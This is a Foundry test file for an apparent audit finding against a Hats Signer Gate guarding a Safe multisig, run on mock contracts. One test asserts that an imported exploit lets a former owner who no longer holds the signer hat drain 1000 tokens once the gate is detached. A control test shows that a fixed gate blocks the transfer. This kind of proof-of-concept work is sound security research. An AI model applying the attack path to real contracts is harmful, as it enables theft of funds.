// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    MockToken,
    MockHats,
    MiniSafe,
    HatsSignerGateFixed,
    Former
} from "./43738-h-1-detaching-hsg-when-theres-non-unregistered-owners-who-no.sol";

contract Finding43738Test is Test {
    function test_exploit_former_owner_transfers_after_detach() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e.former())), 1000 ether, "former took 1000");
        assertEq(e.token().balanceOf(address(e.safe())), 0, "safe emptied");
        assertTrue(e.safe().isOwner(address(e.former())), "former is still a safe owner");
        assertFalse(e.hats().isWearerOfHat(address(e.former()), e.SIGNER_HAT()), "former no longer wears the hat");
        assertTrue(e.guardBlocked(), "guard blocked the same transfer before detach");
        assertEq(e.safe().guard(), address(0), "gate detached");
        emit log_named_uint("former_balance", e.token().balanceOf(address(e.former())));
        emit log_named_uint("safe_balance", e.token().balanceOf(address(e.safe())));
    }

    function test_control_unregisters_former_and_transfer_reverts() public {
        MockToken token = new MockToken();
        MockHats hats = new MockHats();
        MiniSafe safe = new MiniSafe();
        HatsSignerGateFixed fixedHsg = new HatsSignerGateFixed(hats, safe, 1, 2);
        Former former = new Former(safe, token);
        safe.attach(address(fixedHsg));
        safe.addOwner(address(former));
        hats.mint(address(this), 1);
        hats.mint(address(former), 2);
        token.mint(address(safe), 1000 ether);

        hats.move(address(former), address(0x2222), 2);
        fixedHsg.detachHSG();

        assertFalse(safe.isOwner(address(former)), "control unregistered the former wearer");
        vm.expectRevert(bytes("Safe: not owner"));
        former.pull();
        assertEq(token.balanceOf(address(safe)), 1000 ether, "1000 stayed in the safe");
        assertEq(token.balanceOf(address(former)), 0, "former received nothing");
        emit log_named_uint("control_safe_balance", token.balanceOf(address(safe)));
        emit log_named_uint("control_former_balance", token.balanceOf(address(former)));
    }
}
